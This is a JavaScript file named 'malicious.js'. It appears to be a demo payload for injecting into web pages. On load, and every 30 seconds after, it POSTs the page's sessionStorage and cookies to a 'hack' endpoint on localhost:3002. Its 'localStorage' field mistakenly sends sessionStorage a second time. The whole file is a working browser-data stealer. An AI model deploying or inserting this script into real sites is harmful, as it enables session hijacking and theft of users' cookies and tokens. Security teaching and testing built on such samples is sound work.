console.log("malicious.js loaded");

const BACKEND_URL = "http://localhost:3002/hack/window";

function pingServer() {
  fetch(BACKEND_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      sessionStorage: JSON.stringify(window.sessionStorage),
      cookieStorage: JSON.stringify(window.document.cookie),
      localStorage: JSON.stringify(window.sessionStorage),
    }),
  })
    .then((response) => {
      if (!response.ok) throw new Error("Network response was not ok");
      return response.json();
    })
    .then((data) => {
      console.log("Ping success:", data);
    })
    .catch((error) => {
      console.error("Ping failed:", error);
    });
}

// Ping every 30 seconds (30000 ms)
setInterval(pingServer, 30000);

// Optionally, ping immediately on load too
pingServer();
